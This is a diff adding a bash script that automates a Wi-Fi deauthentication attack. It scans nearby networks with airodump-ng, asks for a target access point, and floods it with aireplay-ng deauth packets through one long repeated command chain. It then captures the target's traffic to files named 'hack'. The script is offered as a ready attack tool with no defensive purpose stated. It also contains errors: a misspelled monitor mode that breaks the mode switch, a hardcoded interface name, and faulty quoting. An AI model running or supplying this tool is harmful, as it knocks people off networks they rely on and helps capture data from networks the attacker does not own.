@@ -1,0 +1,47 @@
+#!/bin/bash
+rm -r hack-01.cap hack-01.csv hack-01.kismet.csv hack-01.kismet.netxml hack-01.log.csv
+rm -r filtered_wifi.txt wifi.txt-01.csv
+clear
+
+echo "YOUR INTERFACE NAME"
+read name
+
+ifconfig "$name" down
+iwconfig "$name" mode monitoir
+ifconfig "$name" up
+ifconfig "$name" up
+ifconfig "$name" up
+
+
+# Open a new terminal window with your desired command running in the background
+gnome-terminal -- bash -c "airodump-ng $name" 
+
+# Run airodump-ng in the background and save the process ID
+airodump-ng "$name" --output-format csv --write wifi.txt &
+airodump_pid=$!
+
+# Sleep for 10 seconds (adjust as needed)
+sleep 10
+
+# Terminate the airodump-ng process
+kill $airodump_pid
+
+# Process CSV file and display filtered output
+awk -F, '{gsub(/ /, "", $1); print $1","$14}' wifi.txt-01.csv > filtered_wifi.txt
+
+echo "What is your tergat line number? exjampal 1 2 3 4 5 6 7 8 9 "
+
+read line
+
+selected_line=$(grep -E '^[0-9A-Fa-f:,]+\s*,\s*[^,]+' filtered_wifi.txt | sed -n "${line}p" | awk '{ print $1 }' | tr -d ',')
+
+echo "$selected_line"
+
+echo "tootal namber of ATTACK ? exjampel 100 200 300 400 500 1000 5000"
+read namber
+gnome-terminal -- bash -c  "aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name" || aireplay-ng -a "$selected_line" --deauth "$namber" "$name""
+
+echo "your target channel namber"
+read namber1
+airodump-ng --bssid "$selected_line"  --channel "$namber1" wlan0 --write hack
+
